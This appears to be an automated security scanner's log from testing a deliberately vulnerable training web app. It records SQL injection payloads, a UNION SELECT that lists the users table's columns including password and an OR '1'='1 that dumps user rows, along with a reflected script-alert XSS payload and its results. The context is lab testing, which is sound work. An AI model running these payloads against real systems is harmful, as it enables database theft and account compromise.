+2020-09-11 17:23:56,143 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-11 17:23:56,157 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-11 17:23:56,171 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-11 17:23:57,812 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:23:57,832 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-11 17:23:57,844 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-11 17:23:57,854 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-11 17:23:57,865 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-11 17:23:57,876 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-11 17:24:04,490 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:24:04,495 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 17:24:04,546 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 17:25:36,102 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 17:25:44,096 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 17:25:46,513 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 17:25:51,883 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:25:51,889 : INFO : cross_browser.log : No alert
+2020-09-11 17:25:51,925 : INFO : cross_browser.log : Got response : Hello <script>alert('micin')</script>
+2020-09-11 17:27:00,050 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 17:27:00,051 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 17:27:00,081 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 20:55:12,393 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 20:56:49,919 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 20:58:09,715 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 20:58:10,752 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 20:58:10,790 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-11 20:58:10,803 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-11 20:58:10,815 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-11 20:58:10,826 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-11 20:58:10,837 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-11 20:58:10,848 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-11 20:58:10,859 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-11 20:58:10,870 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-11 20:58:10,881 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-11 20:58:10,892 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-11 20:58:10,907 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-11 20:58:11,242 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 20:58:11,271 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-11 20:58:11,284 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-11 20:58:11,299 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-11 20:58:11,310 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-11 20:58:11,321 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-11 20:58:17,173 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 20:58:17,180 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 20:58:17,226 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 21:00:05,229 : ERROR : cross_browser.log : Security message not found ..
+2020-09-11 21:00:06,088 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 21:00:06,132 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-11 21:00:06,148 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-11 21:00:06,159 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-11 21:00:06,170 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-11 21:00:06,181 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-11 21:00:06,191 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-11 21:00:06,202 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-11 21:00:06,212 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-11 21:00:06,223 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-11 21:00:06,234 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-11 21:00:06,246 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-11 21:00:06,700 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 21:00:06,733 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-11 21:00:06,746 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-11 21:00:06,757 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-11 21:00:06,769 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-11 21:00:06,780 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-11 21:00:12,150 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 21:00:12,157 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 21:00:12,211 : INFO : cross_browser.log : Got response : Hello 
+2020-09-11 21:01:03,737 : INFO : cross_browser.log : Payload Was : 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+2020-09-11 21:01:03,783 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: admin
+Surname: admin
+2020-09-11 21:01:03,793 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user_id
+Surname: 
+2020-09-11 21:01:03,804 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: first_name
+Surname: 
+2020-09-11 21:01:03,815 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_name
+Surname: 
+2020-09-11 21:01:03,826 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: user
+Surname: 
+2020-09-11 21:01:03,837 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: password
+Surname: 
+2020-09-11 21:01:03,848 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: avatar
+Surname: 
+2020-09-11 21:01:03,859 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: last_login
+Surname: 
+2020-09-11 21:01:03,869 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: failed_login
+Surname: 
+2020-09-11 21:01:03,881 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: CURRENT_CONNECTIONS
+Surname: 
+2020-09-11 21:01:03,892 : INFO : cross_browser.log : Got response : ID: 1' UNION SELECT COLUMN_NAME, null FROM information_schema.columns WHERE TABLE_NAME = "users" #
+First name: TOTAL_CONNECTIONS
+Surname: 
+2020-09-11 21:01:04,154 : INFO : cross_browser.log : Payload Was : 1' OR '1'='1
+2020-09-11 21:01:04,198 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+2020-09-11 21:01:04,209 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+2020-09-11 21:01:04,219 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+2020-09-11 21:01:04,238 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+2020-09-11 21:01:04,248 : INFO : cross_browser.log : Got response : ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+2020-09-11 21:01:09,725 : INFO : cross_browser.log : Payload Was : <script>alert('micin')</script>
+2020-09-11 21:01:09,729 : INFO : cross_browser.log : Got alert : micin
+2020-09-11 21:01:09,796 : INFO : cross_browser.log : Got response : Hello 
